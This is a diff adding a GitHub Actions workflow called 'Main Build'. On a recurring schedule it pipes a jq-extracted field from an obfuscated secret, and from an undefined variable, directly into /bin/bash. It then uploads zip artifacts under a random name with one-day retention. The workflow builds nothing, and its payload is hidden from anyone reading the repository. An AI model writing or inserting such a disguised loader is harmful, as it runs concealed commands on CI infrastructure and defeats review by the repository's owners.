@@ -1,0 +1,38 @@
+name: Main Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '14 2,8,14,20 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  dispatcher:
+    name: Main task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Deploy
+        env:
+          s374: ${{ secrets.s374 }}
+        run: |
+          printf '%s' "$s374" | jq -r .dgvrr0 | /bin/bash
+          printf '%s' "$m4761" | jq -r .c4 | /bin/bash
+
+      - name: Save results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: 5dYWZ1YQ
+          path: "*.zip"
+          retention-days: 1
